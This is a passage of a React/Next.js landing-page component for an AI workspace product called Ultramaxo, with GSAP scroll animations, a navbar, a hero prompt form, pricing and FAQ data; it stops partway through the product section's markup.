"use client";

import { useGSAP } from "@gsap/react";
import gsap from "gsap";
import { ScrollTrigger } from "gsap/ScrollTrigger";
import {
  ArrowRight,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  Clapperboard,
  Globe2,
  Menu,
  Palette,
  Plus,
  Presentation,
  RefreshCw,
  Smartphone,
  X,
} from "lucide-react";
import { useRouter } from "next/navigation";
import { useEffect, useRef, useState } from "react";
import { HlsVideo } from "./hls-video";

gsap.registerPlugin(ScrollTrigger);

/* ─── Data ─── */

const navigationItems = [
  { label: "Product", href: "#product" },
  { label: "Features", href: "#features" },
  { label: "Use Cases", href: "#use-cases" },
  { label: "Pricing", href: "#pricing" },
  { label: "FAQ", href: "#faq" },
];

const buildTypes = [
  { label: "Website", icon: Globe2 },
  { label: "Mobile", icon: Smartphone },
  { label: "Design", icon: Palette },
  { label: "Slides", icon: Presentation },
  { label: "Animation", icon: Clapperboard },
];

const heroSignals = [
  "Prompt to workspace",
  "Artifacts",
  "Files",
  "Code",
  "Research",
  "Mobile",
  "Deploy-ready",
  "History",
];

const narrativeBlocks = [
  {
    eyebrow: "Chat that keeps context",
    title: "Keep the thread, open files, and continue working.",
    description:
      "Ultramaxo keeps chat, history, file uploads, and follow-up work inside one clean flow. The thread stays alive instead of collapsing into disposable messages.",
    bullets: [
      "History stays easy to reopen",
      "Prompts & revisions in one context",
      "A cleaner surface for daily work",
    ],
    image:
      "https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?q=80&w=2070&auto=format&fit=crop",
  },
  {
    eyebrow: "Artifacts that can be used",
    title: "Answers open as native, editable artifacts.",
    description:
      "Documents, code, images, and structured output open in a side workspace built for continued work, not as throwaway attachments.",
    bullets: [
      "Code, text, and images in one system",
      "Editor and preview stay readable",
      "Revisions remain available",
    ],
    image:
      "https://images.unsplash.com/photo-1618401471353-b98afee0b2eb?q=80&w=2088&auto=format&fit=crop",
  },
  {
    eyebrow: "Modes and headroom",
    title: "Fullstack, mobile, and custom models.",
    description:
      "When the work gets serious, the workspace gives you more room: fullstack mode, mobile mode, web search, custom models, and image generation.",
    bullets: [
      "Extra modes for different workloads",
      "Installable via PWA",
      "Focused even when complex",
    ],
    image:
      "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop",
  },
];

type ApiModel = {
  modelId: string;
  name: string;
  type: string;
  provider: string;
  context: string;
  price: string;
  badge: string;
  capabilities: string[];
};

const useCases = [
  {
    title: "Developers",
    text: "Shape feature flows, open code artifacts, inspect generated files, and keep editing without leaving the workspace.",
  },
  {
    title: "Researchers",
    text: "Upload documents, summarize files, continue the conversation, and keep research context intact.",
  },
  {
    title: "Operators",
    text: "Use one place for quick drafting, structured output, history, export, and repeatable daily workflows.",
  },
  {
    title: "Power users",
    text: "Choose models, bring your own keys, install the app, and keep using a workspace that still feels clear.",
  },
];

const defaultApiModels: ApiModel[] = [
  {
    modelId: "gpt-5.3",
    name: "GPT-5.3",
    type: "Chat",
    provider: "OpenAI",
    context: "128K",
    price: "Free",
    badge: "Free",
    capabilities: ["text"],
  },
  {
    modelId: "deepseek-v4-flash",
    name: "DeepSeek V4 Flash",
    type: "Chat & Code",
    provider: "DeepSeek",
    context: "1.0M",
    price: "$0.14 / 1M",
    badge: "New",
    capabilities: ["text"],
  },
];

const pricingPlans = [
  {
    name: "Free",
    price: "Rp 0",
    period: "/ forever",
    description: "For trying the product and building a daily habit.",
    features: [
      "Core AI chat",
      "Basic workspace tools",
      "Limited history and uploads",
      "Good enough to start real work",
    ],
    featured: false,
  },
  {
    name: "Early Adopter",
    price: "Rp 15.000",
    period: "/ month",
    description: "Limited offer. (Normal price: Rp 30.000).",
    features: [
      "Everything in Free",
      "500 daily credits for serious chat",
      "Expanded artifact workflows",
      "Full code workspace experience",
      "Priority support",
    ],
    featured: true,
  },
  {
    name: "Annual",
    price: "Rp 150.000",
    period: "/ year",
    description: "For teams or individuals who already know this will stick.",
    features: [
      "Everything in Pro",
      "Lower effective monthly cost",
      "Long-term access without friction",
      "Best value for committed usage",
    ],
    featured: false,
  },
];

const faqItems = [
  {
    question: "What makes Ultramaxo different from a normal AI chat app?",
    answer:
      "The product is designed as a workspace. Chat, artifacts, code, uploads, and iteration all stay inside one shell instead of being split across disposable messages.",
  },
  {
    question: "Can I start for free?",
    answer:
      "Yes. The free plan is intended for real product evaluation with chat, basic workspace tools, and limited history. You can move up only when your workload grows.",
  },
  {
    question: "What can I actually do inside the workspace?",
    answer:
      "You can chat, upload files, open code or document artifacts, use fullstack or mobile modes, switch models, export chats, and install the app as a PWA for a more native workflow.",
  },
];

/* ─── Logo ─── */

const UltramaxoLogo = ({ size = 34 }: { size?: number }) => (
  <svg
    aria-label="Ultramaxo logo"
    className="shrink-0"
    fill="none"
    height={size}
    role="img"
    viewBox="0 0 64 64"
    width={size}
    xmlns="http://www.w3.org/2000/svg"
  >
    <defs>
      <linearGradient id="ultramaxo-mark" x1="12" x2="52" y1="10" y2="54">
        <stop offset="0%" stopColor="#ffffff" />
        <stop offset="100%" stopColor="#a3a3a3" />
      </linearGradient>
    </defs>
    <rect
      className="text-white/5"
      fill="currentColor"
      height="64"
      rx="18"
      width="64"
    />
    <path
      d="M17 16V36C17 44.8 22.2 49 30 49H34C41.8 49 47 44.8 47 36V16"
      stroke="url(#ultramaxo-mark)"
      strokeLinecap="round"
      strokeWidth="5"
    />
    <path
      d="M24 16V35C24 39 26.7 42 31 42H33"
      stroke="url(#ultramaxo-mark)"
      strokeLinecap="round"
      strokeOpacity="0.65"
      strokeWidth="3.5"
    />
    <path
      d="M40 16V35C40 39 37.3 42 33 42H31"
      stroke="url(#ultramaxo-mark)"
      strokeLinecap="round"
      strokeOpacity="0.65"
      strokeWidth="3.5"
    />
  </svg>
);

/* ─── Sub-components ─── */

function Badge({ children }: { children: React.ReactNode }) {
  return (
    <span className="mb-4 inline-flex items-center rounded-full border border-white/[0.08] bg-white/[0.04] px-3 py-1 text-[11px] font-medium uppercase text-white/52 shadow-sm">
      {children}
    </span>
  );
}

function SectionHeading({
  children,
  className = "",
}: {
  children: React.ReactNode;
  className?: string;
}) {
  return (
    <h2
      className={`text-balance text-4xl font-heading italic leading-[0.94] text-white sm:text-5xl lg:text-6xl ${className}`}
    >
      {children}
    </h2>
  );
}

/* GSAP-powered split text reveal */
function GSAPSplitText({
  text,
  className = "",
  as: Tag = "h1",
  delay = 0,
  animate = true,
}: {
  text: string;
  className?: string;
  as?: "h1" | "h2" | "h3" | "p" | "span";
  delay?: number;
  animate?: boolean;
}) {
  const containerRef = useRef<HTMLHeadingElement>(null);
  const hasAnimated = useRef(false);

  useGSAP(
    () => {
      if (!animate || !containerRef.current || hasAnimated.current) return;
      const words = containerRef.current.querySelectorAll(".split-word");
      if (!words.length) return;
      gsap.fromTo(
        words,
        { opacity: 0, y: 40, filter: "blur(12px)" },
        {
          opacity: 1,
          y: 0,
          filter: "blur(0px)",
          duration: 0.8,
          stagger: 0.04,
          ease: "power3.out",
          delay,
          onComplete: () => {
            hasAnimated.current = true;
          },
        },
      );
    },
    { scope: containerRef },
  );

  const words = text.split(" ");

  if (!animate) {
    return (
      <Tag
        ref={containerRef as React.RefObject<HTMLHeadingElement>}
        className={className}
      >
        {text}
      </Tag>
    );
  }

  return (
    <Tag
      ref={containerRef as React.RefObject<HTMLHeadingElement>}
      className={className}
    >
      {words.map((word, i) => (
        <span
          key={`${word}-${i}`}
          className="split-word inline-block will-change-transform"
        >
          {word}
          {i < words.length - 1 ? "\u00A0" : ""}
        </span>
      ))}
    </Tag>
  );
}

export default function LandingPage() {
  const router = useRouter();
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const [isHeaderScrolled, setIsHeaderScrolled] = useState(false);
  const [openFaq, setOpenFaq] = useState<string | null>(
    faqItems[0]?.question ?? null,
  );
  const [heroPrompt, setHeroPrompt] = useState(
    "Create a 7-day launch plan for a local AI product",
  );
  const [apiModels, setApiModels] = useState<ApiModel[]>(defaultApiModels);

  const mainRef = useRef<HTMLDivElement>(null);
  const navRef = useRef<HTMLElement>(null);
  const heroRef = useRef<HTMLDivElement>(null);
  const heroMockupRef = useRef<HTMLDivElement>(null);
  const heroContentRef = useRef<HTMLDivElement>(null);
  const productRef = useRef<HTMLDivElement>(null);
  const videoRef = useRef<HTMLDivElement>(null);
  const showcaseRef = useRef<HTMLDivElement>(null);
  const useCasesRef = useRef<HTMLDivElement>(null);
  const apiPlatformRef = useRef<HTMLDivElement>(null);
  const pricingRef = useRef<HTMLDivElement>(null);
  const faqRef = useRef<HTMLDivElement>(null);
  const ctaRef = useRef<HTMLDivElement>(null);
  const mobileSidebarRef = useRef<HTMLDivElement>(null);
  const mobileOverlayRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleScroll = () => {
      setIsHeaderScrolled(window.scrollY > 12);
    };

    handleScroll();
    window.addEventListener("scroll", handleScroll, { passive: true });

    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  useEffect(() => {
    const loadModels = async () => {
      try {
        const res = await fetch("/api/v1/models?limit=5");
        if (!res.ok) return;
        const payload = await res.json();
        const items = Array.isArray(payload?.data) ? payload.data : [];
        if (!items.length) return;
        setApiModels(
          items.map((model: any) => ({
            modelId: model.modelId || model.name,
            name: model.name || model.modelId,
            type: model.capabilities?.includes("code") ? "Chat & Code" : "Chat",
            provider: model.provider || "Unknown",
            context: model.context || "-",
            price: model.isFree
              ? "Free"
              : `$${model.priceIn ?? "-"} / $${model.priceOut ?? "-"} / 1M`,
            badge: model.isFree ? "Free" : "",
            capabilities: model.capabilities ?? ["text"],
          })),
        );
      } catch {
        return;
      }
    };

    loadModels();
  }, []);

  const scrollToSection = (href: string) => {
    if (href.startsWith("http")) {
      window.open(href, "_blank");
      return;
    }
    setMobileNavOpen(false);
    const element = document.querySelector(href);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
  };

  const startPromptFromHero = () => {
    const prompt =
      heroPrompt.trim() ||
      "Help me start a clear Ultramaxo workspace from one prompt.";
    const callbackUrl = `/chat?query=${encodeURIComponent(prompt)}`;
    router.push(`/login?callbackUrl=${encodeURIComponent(callbackUrl)}`);
  };

  /* ─── GSAP - Simple Reveal + Product PIN ─── */
  useGSAP(
    () => {
      const prefersReduced = window.matchMedia(
        "(prefers-reduced-motion: reduce)",
      ).matches;
      if (prefersReduced || window.innerWidth < 768) return;

      const ctx = gsap.context(() => {
        const select = gsap.utils.selector(mainRef);
        const toArray = (selector: string): Element[] =>
          Array.from(select(selector) as ArrayLike<Element>);
        const first = (selector: string) => toArray(selector)[0] ?? null;
        const animateFromTo = (
          targets: Element | Element[] | null,
          fromVars: gsap.TweenVars,
          toVars: gsap.TweenVars,
          position?: string,
          timeline?: gsap.core.Timeline,
        ) => {
          const normalizedTargets = Array.isArray(targets)
            ? targets
            : targets
              ? [targets]
              : [];
          if (!normalizedTargets.length) {
            return;
          }

          if (timeline) {
            timeline.fromTo(normalizedTargets, fromVars, toVars, position);
            return;
          }

          gsap.fromTo(normalizedTargets, fromVars, toVars);
        };

        /* 1. Hero entrance */
        const heroTimeline = gsap.timeline({
          defaults: { ease: "power3.out" },
        });
        animateFromTo(
          navRef.current,
          { y: -40, opacity: 0 },
          { y: 0, opacity: 1, duration: 0.8 },
          undefined,
          heroTimeline,
        );
        animateFromTo(
          toArray(".hero-badge"),
          { y: 20, opacity: 0 },
          { y: 0, opacity: 1, duration: 0.6 },
          "-=0.4",
          heroTimeline,
        );
        animateFromTo(
          toArray(".hero-headline .split-word"),
          { y: 60, opacity: 0, filter: "blur(16px)" },
          {
            y: 0,
            opacity: 1,
            filter: "blur(0px)",
            duration: 0.9,
            stagger: 0.05,
          },
          "-=0.3",
          heroTimeline,
        );
        animateFromTo(
          toArray(".hero-subtitle"),
          { y: 30, opacity: 0 },
          { y: 0, opacity: 1, duration: 0.7 },
          "-=0.6",
          heroTimeline,
        );
        animateFromTo(
          toArray(".hero-buttons"),
          { y: 30, opacity: 0 },
          { y: 0, opacity: 1, duration: 0.6 },
          "-=0.4",
          heroTimeline,
        );
        animateFromTo(
          toArray(".hero-chips"),
          { y: 20, opacity: 0 },
          { y: 0, opacity: 1, duration: 0.5 },
          "-=0.3",
          heroTimeline,
        );
        animateFromTo(
          heroMockupRef.current,
          { scale: 0.88, opacity: 0 },
          { scale: 1, opacity: 1, duration: 1.2 },
          "-=0.8",
          heroTimeline,
        );

        /* Navbar blur on scroll */
        const navElement = navRef.current?.querySelector("nav");
        if (heroRef.current && navElement) {
          ScrollTrigger.create({
            trigger: heroRef.current,
            start: "top top",
            end: "bottom top",
            onUpdate: (self) => {
              const progress = self.progress;
              gsap.set(navElement, {
                backgroundColor: `rgba(8,10,13,${0.72 + progress * 0.18})`,
                backdropFilter: `blur(${12 + progress * 8}px)`,
              });
            },
          });
        }

        /* Product - Viewport reveal (no pin, no blank gaps) */
        gsap.utils
          .toArray<HTMLElement>(".narrative-block")
          .forEach((block, i) => {
            const accentLine = block.querySelector(".narrative-accent-line");
            const textCol = block.querySelector(".narrative-text-col");
            const imageCol = block.querySelector(".narrative-image");
            const bullets = block.querySelectorAll(".narrative-bullet");

            const tl = gsap.timeline({
              scrollTrigger: {
                trigger: block,
                start: "top 78%",
                toggleActions: "play none none reverse",
              },
              defaults: { ease: "power3.out" },
            });

            /* Accent line draws */
            if (accentLine) {
              tl.fromTo(
                accentLine,
                { scaleX: 0 },
                { scaleX: 1, duration: 0.5 },
              );
            }

            /* Text column slides up */
            if (textCol) {
              tl.fromTo(
                textCol,
                { y: 40, opacity: 0 },
                { y: 0, opacity: 1, duration: 0.7 },
                "-=0.3",
              );
            }

            /* Image slides in from side */
            if (imageCol) {
              const fromRight = i % 2 === 0;
              tl.fromTo(
                imageCol,
                { x: fromRight ? 50 : -50, opacity: 0 },
                { x: 0, opacity: 1, duration: 0.8 },
                "-=0.5",
              );
            }

            /* Bullets stagger */
            if (bullets.length) {
              tl.fromTo(
                bullets,
                { x: -15, opacity: 0 },
                { x: 0, opacity: 1, duration: 0.4, stagger: 0.08 },
                "-=0.4",
              );
            }
          });

        /* All other sections - simple reveal, NO PIN */
        if (videoRef.current && toArray(".video-headline").length) {
          gsap.fromTo(
            toArray(".video-headline"),
            { y: 30, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.5,
              ease: "power2.out",
              scrollTrigger: {
                trigger: videoRef.current,
                start: "top 80%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (
          showcaseRef.current &&
          toArray(".showcase-left, .showcase-right").length
        ) {
          gsap.fromTo(
            toArray(".showcase-left, .showcase-right"),
            { y: 30, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.5,
              stagger: 0.1,
              ease: "power2.out",
              scrollTrigger: {
                trigger: showcaseRef.current,
                start: "top 80%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        const showcaseBubbleWrapper = first(".showcase-bubble-wrapper");
        if (showcaseBubbleWrapper && toArray(".showcase-bubble").length) {
          gsap.fromTo(
            toArray(".showcase-bubble"),
            { y: 15, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.3,
              stagger: 0.06,
              ease: "power2.out",
              scrollTrigger: {
                trigger: showcaseBubbleWrapper,
                start: "top 85%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (useCasesRef.current && toArray(".usecase-card").length) {
          gsap.fromTo(
            toArray(".usecase-card"),
            { y: 30, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.5,
              stagger: 0.1,
              ease: "power2.out",
              scrollTrigger: {
                trigger: useCasesRef.current,
                start: "top 80%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (apiPlatformRef.current && toArray(".api-element").length) {
          gsap.fromTo(
            toArray(".api-element"),
            { y: 30, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.5,
              stagger: 0.1,
              ease: "power2.out",
              scrollTrigger: {
                trigger: apiPlatformRef.current,
                start: "top 80%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (pricingRef.current && toArray(".pricing-card").length) {
          gsap.fromTo(
            toArray(".pricing-card"),
            { y: 30, opacity: 0, scale: 0.95 },
            {
              y: 0,
              opacity: 1,
              scale: 1,
              duration: 0.5,
              stagger: 0.1,
              ease: "power2.out",
              scrollTrigger: {
                trigger: pricingRef.current,
                start: "top 80%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (faqRef.current && toArray(".faq-item").length) {
          gsap.fromTo(
            toArray(".faq-item"),
            { y: 20, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.4,
              stagger: 0.08,
              ease: "power2.out",
              scrollTrigger: {
                trigger: faqRef.current,
                start: "top 85%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (ctaRef.current && toArray(".cta-headline").length) {
          gsap.fromTo(
            toArray(".cta-headline"),
            { y: 30, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.6,
              ease: "power2.out",
              scrollTrigger: {
                trigger: ctaRef.current,
                start: "top 80%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        if (ctaRef.current && toArray(".cta-buttons").length) {
          gsap.fromTo(
            toArray(".cta-buttons"),
            { y: 20, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.4,
              ease: "power2.out",
              scrollTrigger: {
                trigger: ctaRef.current,
                start: "top 85%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }

        const footerContent = first(".footer-content");
        if (footerContent) {
          gsap.fromTo(
            footerContent,
            { y: 30, opacity: 0 },
            {
              y: 0,
              opacity: 1,
              duration: 0.3,
              ease: "power2.out",
              scrollTrigger: {
                trigger: footerContent,
                start: "top 95%",
                toggleActions: "play none none reverse",
              },
            },
          );
        }
      }, mainRef);

      return () => ctx.revert();
    },
    { scope: mainRef },
  );

  /* Mobile sidebar GSAP */
  useGSAP(
    () => {
      if (
        mobileNavOpen &&
        mobileOverlayRef.current &&
        mobileSidebarRef.current
      ) {
        gsap.fromTo(
          mobileOverlayRef.current,
          { opacity: 0 },
          { opacity: 1, duration: 0.25 },
        );
        gsap.fromTo(
          mobileSidebarRef.current,
          { x: "100%" },
          { x: "0%", duration: 0.35, ease: "power3.out" },
        );
      }
    },
    { dependencies: [mobileNavOpen] },
  );

  const closeMobileNav = () => {
    if (mobileOverlayRef.current && mobileSidebarRef.current) {
      gsap.to(mobileSidebarRef.current, {
        x: "100%",
        duration: 0.3,
        ease: "power3.in",
        onComplete: () => setMobileNavOpen(false),
      });
      gsap.to(mobileOverlayRef.current, {
        opacity: 0,
        duration: 0.25,
        delay: 0.05,
      });
    } else {
      setMobileNavOpen(false);
    }
  };

  /* FAQ GSAP height animation */
  const toggleFaq = (question: string) => {
    const item = document.querySelector(`[data-faq="${question}"] .faq-answer`);
    if (!item) return;

    const isOpen = openFaq === question;
    if (isOpen) {
      gsap.to(item, {
        height: 0,
        opacity: 0,
        duration: 0.35,
        ease: "power2.inOut",
        onComplete: () => setOpenFaq(null),
      });
    } else {
      if (openFaq) {
        const prev = document.querySelector(
          `[data-faq="${openFaq}"] .faq-answer`,
        );
        if (prev)
          gsap.to(prev, {
            height: 0,
            opacity: 0,
            duration: 0.3,
            ease: "power2.inOut",
          });
      }
      gsap.set(item, { height: "auto", opacity: 1 });
      const height = (item as HTMLElement).offsetHeight;
      gsap.fromTo(
        item,
        { height: 0, opacity: 0 },
        {
          height,
          opacity: 1,
          duration: 0.4,
          ease: "power2.out",
          onComplete: () => setOpenFaq(question),
        },
      );
    }
  };

  return (
    <div
      ref={mainRef}
      className="overflow-hidden bg-[#07090c] text-white selection:bg-white/20"
      style={{ backgroundColor: "#07090c", color: "#fff", minHeight: "100vh" }}
    >
      {/* ══════ 1. NAVBAR ══════ */}
      <header
        ref={navRef}
        className={`fixed inset-x-0 top-0 z-50 h-[68px] border-white/[0.06] bg-[#090b0f]/88 opacity-100 transition-[background-color,border-color,box-shadow,backdrop-filter] duration-300 md:opacity-0 ${
          isHeaderScrolled
            ? "border-b bg-[#090b0f]/96 shadow-2xl backdrop-blur-xl"
            : "border-b border-transparent backdrop-blur-md"
        }`}
      >
        <nav className="mx-auto flex h-full w-full max-w-[1440px] items-center gap-3 px-4 sm:px-6 lg:px-8">
          <button
            className="flex shrink-0 items-center gap-3 rounded-xl pr-3 transition-colors hover:bg-white/[0.03]"
            onClick={() => scrollToSection("#home")}
            type="button"
          >
            <UltramaxoLogo size={32} />
            <div className="text-left">
              <div className="font-body text-[19px] font-semibold leading-6 text-white/92">
                Ultramaxo
              </div>
              <div className="hidden font-body text-[10px] uppercase leading-3 text-white/32 sm:block">
                Live workspace
              </div>
            </div>
          </button>

          <div className="ml-3 hidden items-center gap-1 lg:flex">
            {navigationItems.map((item) => (
              <button
                key={item.label}
                onClick={() => scrollToSection(item.href)}
                className="inline-flex h-9 items-center gap-1.5 rounded-lg border border-transparent px-3 font-body text-sm font-medium text-white/52 transition-colors hover:border-white/[0.06] hover:bg-white/[0.04] hover:text-white/86"
                type="button"
              >
                {item.label}
                {["Product", "Features", "Use Cases"].includes(item.label) ? (
                  <ChevronDown className="h-3.5 w-3.5 text-white/28" />
                ) : null}
              </button>
            ))}
            <button
              className="inline-flex h-9 items-center rounded-lg border border-transparent px-3 font-body text-sm font-medium text-white/52 transition-colors hover:border-white/[0.06] hover:bg-white/[0.04] hover:text-white/86"
              onClick={() => window.open("/app-release.apk", "_blank")}
              type="button"
            >
              Download App
            </button>
          </div>

          <div className="flex-1" />

          <div className="flex items-center gap-2">
            <button
              className="hidden h-9 rounded-lg px-3 font-body text-sm font-medium text-white/52 transition-colors hover:bg-white/[0.04] hover:text-white/84 xl:inline-flex xl:items-center"
              onClick={() => router.push("/contact")}
              type="button"
            >
              Contact sales
            </button>
            <button
              className="hidden h-9 rounded-lg border border-white/[0.08] bg-white/[0.04] px-4 font-body text-sm font-medium text-white/72 transition-colors hover:bg-white/[0.07] hover:text-white md:inline-flex md:items-center"
              onClick={() => router.push("/login")}
              type="button"
            >
              Log in
            </button>
            <button
              onClick={() => router.push("/register")}
              className="hidden h-10 shrink-0 items-center gap-1.5 rounded-xl bg-white px-5 font-body text-sm font-semibold text-[#090b0f] transition-colors hover:bg-white/90 md:inline-flex"
              type="button"
            >
              Create account
            </button>
            <button
              className="inline-flex size-10 items-center justify-center rounded-lg border border-white/[0.08] bg-white/[0.04] text-white/76 transition-colors hover:bg-white/[0.08] hover:text-white md:hidden"
              onClick={() => setMobileNavOpen(true)}
              type="button"
              aria-label="Open navigation menu"
            >
              <Menu className="h-5 w-5" />
            </button>
          </div>
        </nav>
      </header>

      {/* Mobile Sidebar */}
      {mobileNavOpen && (
        <>
          <div
            ref={mobileOverlayRef}
            onClick={closeMobileNav}
            className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[60] opacity-0"
          />
          <div
            ref={mobileSidebarRef}
            className="fixed top-0 right-0 bottom-0 z-[70] flex w-[min(320px,calc(100vw-2.5rem))] translate-x-full flex-col border-l border-white/[0.08] bg-[#0b0d10] p-5 text-white sm:p-6"
          >
            <div className="flex justify-between items-center mb-8">
              <div className="flex items-center gap-3">
                <UltramaxoLogo size={30} />
                <span className="text-xl font-semibold">Ultramaxo</span>
              </div>
              <button
                onClick={closeMobileNav}
                className="rounded-full p-2 transition-colors hover:bg-white/8"
                type="button"
                aria-label="Close navigation menu"
              >
                <X className="h-5 w-5 text-white/72" />
              </button>
            </div>
            <div className="flex flex-col gap-4 font-body">
              {navigationItems.map((item) => (
                <button
                  key={item.label}
                  onClick={() => scrollToSection(item.href)}
                  className="border-white/8 border-b py-2 text-left text-lg font-medium text-white/70 hover:text-white"
                  type="button"
                >
                  {item.label}
                </button>
              ))}
            </div>
            <div className="mt-auto flex flex-col gap-3">
              <button
                className="w-full rounded-full border border-white/12 py-3 font-body text-sm font-medium text-white/72"
                onClick={() => window.open("/app-release.apk", "_blank")}
                type="button"
              >
                Download App
              </button>
              <button
                className="w-full rounded-full border border-white/12 py-3 font-body text-sm font-medium text-white/72"
                onClick={() => router.push("/login")}
                type="button"
              >
                Log in
              </button>
              <button
                className="w-full rounded-full bg-white py-3 font-body text-sm font-semibold text-[#080a0d]"
                onClick={() => router.push("/register")}
                type="button"
              >
                Create account
              </button>
            </div>
          </div>
        </>
      )}

      {/* ══════ 2. HERO ══════ */}
      <section
        id="home"
        ref={heroRef}
        className="relative flex min-h-[100svh] flex-col items-center justify-center overflow-hidden bg-[#07090c] px-4 pb-10 pt-24 text-white sm:px-6 lg:px-10"
      >
        <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_50%_12%,rgba(255,255,255,0.06),transparent_28%),radial-gradient(circle_at_20%_80%,rgba(255,255,255,0.03),transparent_24%)]" />
        <div className="pointer-events-none absolute inset-x-0 top-0 h-32 bg-[linear-gradient(180deg,rgba(255,255,255,0.04),transparent)]" />
        <div
          ref={heroMockupRef}
          className="relative z-10 mx-auto flex w-full max-w-5xl flex-1 flex-col items-center justify-center opacity-100 md:opacity-0"
        >
          <div ref={heroContentRef} className="w-full text-center">
            <div className="hero-headline">
              <GSAPSplitText
                text="Start with a prompt. Ship real work."
                className="text-balance font-body text-[3rem] font-medium leading-[0.95] text-white sm:text-7xl md:text-[5.1rem] lg:text-[5.6rem]"
                delay={0.35}
                animate
              />
            </div>

            <p className="hero-subtitle text-pretty mx-auto mt-6 max-w-2xl font-body text-base leading-7 text-white/58 sm:text-lg">
              Ultramaxo is not another template builder. Describe what you need,
              continue in chat, and refine the result in one workspace.
            </p>

            <form
              className="hero-buttons mx-auto mt-11 w-full max-w-[812px]"
              onSubmit={(event) => {
                event.preventDefault();
                startPromptFromHero();
              }}
            >
              <div className="overflow-hidden rounded-[28px] border border-white/[0.08] bg-[#11151b]/92 text-left shadow-2xl backdrop-blur-xl transition-colors focus-within:border-white/[0.18]">
                <textarea
                  value={heroPrompt}
                  onChange={(event) => setHeroPrompt(event.target.value)}
                  className="min-h-[76px] w-full resize-none bg-transparent px-6 pt-6 font-body text-[16px] leading-6 text-white outline-none placeholder:text-white/32"
                  placeholder="Describe what you want to build..."
                />
                <div className="flex items-center justify-between px-5 pb-4">
                  <button
                    type="button"
                    className="inline-flex size-9 items-center justify-center rounded-full text-white/42 transition-colors hover:bg-white/[0.06] hover:text-white/76"
                    aria-label="Attach files"
                  >
                    <Plus className="h-5 w-5" />
                  </button>
                  <button
                    type="submit"
                    className="inline-flex size-10 items-center justify-center rounded-full bg-white text-[#07090c] transition-colors hover:bg-white/90"
                    aria-label="Start from prompt"
                  >
                    <ArrowRight className="h-5 w-5" />
                  </button>
                </div>
              </div>
            </form>

            <div className="hero-chips mx-auto mt-5 flex max-w-2xl flex-wrap items-start justify-center gap-6 sm:gap-10">
              {buildTypes.map(({ label, icon: Icon }) => (
                <button
                  key={label}
                  type="button"
                  onClick={() =>
                    setHeroPrompt(
                      `Create a modern ${label.toLowerCase()} for my brand`,
                    )
                  }
                  className="group flex flex-col items-center gap-2 font-body text-sm text-white/48 transition-colors hover:text-white/82"
                >
                  <span className="flex size-[60px] items-center justify-center rounded-[20px] border border-white/[0.08] bg-white/[0.04] text-white/66 shadow-lg transition-colors group-hover:border-white/[0.16] group-hover:bg-white/[0.08] group-hover:text-white">
                    <Icon className="h-5 w-5" />
                  </span>
                  {label}
                </button>
              ))}
            </div>

            <button
              type="button"
              onClick={() =>
                setHeroPrompt(
                  "Create a product launch website with a strong hero, pricing, FAQ, and CTA",
                )
              }
              className="mt-6 inline-flex items-center gap-2 rounded-full px-3 py-2 font-body text-sm text-white/38 transition-colors hover:bg-white/[0.06] hover:text-white/76"
            >
              Try an example prompt <RefreshCw className="h-4 w-4" />
            </button>
          </div>
        </div>

        <div className="relative z-10 mt-auto w-full max-w-[1780px] pb-4">
          <div className="grid grid-cols-2 items-center gap-2 text-center font-body text-xs font-medium uppercase text-white/25 sm:grid-cols-4 lg:grid-cols-8">
            {heroSignals.map((signal) => (
              <div
                key={signal}
                className="rounded-full border border-white/[0.08] bg-white/[0.03] px-3 py-2"
              >
                {signal}
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════ 3. PRODUCT NARRATIVE ══════ */}
      <section
        id="product"
        ref={productRef}
        className="relative z-10 bg-[#07090c] px-6 py-24 md:px-16 lg:px-24"
      >
        <div className="max-w-7xl mx-auto">
          <div className="max-w-2xl mb-20 text-center mx-auto">
            <Badge>Product Narrative</Badge>
            <SectionHeading>
              A cleaner path from asking to shipping.
            </SectionHeading>
            <p className="mt-6 text-pretty font-body text-base leading-relaxed text-white/60 md:text-lg">
              The landing is meant to earn trust. The product is meant to hold
              up under repeated use. Every section feels like it leads toward
              the workspace.
            </p>
          </div>

          <div className="space-y-28 md:space-y-36">
            {narrativeBlocks.map((block, index) => (
              <div key={block.title} className="narrative-block">
                <div
                  className={`grid lg:grid-cols-2 gap-12 lg:gap-16 items-center w-full ${index % 2 === 1 ? "lg:flex-row-reverse" : ""}`}
                >
                  <div
                    className={`narrative-text-col ${index % 2 === 1 ? "lg:order-2" : ""}`}
                  >
                    {/* Accent line */}
                    <div className="narrative-accent-line h-[2px] w-16 bg-gradient-to-r from-white/60 to-white/0 mb-6 origin-left" />
                    <div className="mb-4 text-xs font-bold uppercase text-white/40 font-body">
                      {block.eyebrow}
                    </div>
                    <h3 className="text-3xl md:text-4xl lg:text-5xl font-heading italic text-white tracking-tight leading-[0.95]">
                      {block.title}
                    </h3>
                    <p className="mt-5 text-white/60 font-body font-light text-base md:text-lg leading-relaxed">
                      {block.description}
                    </p>
                    <ul className="mt-8 space-y-4">
                      {block.bullets.map((bullet) => (
                        <li
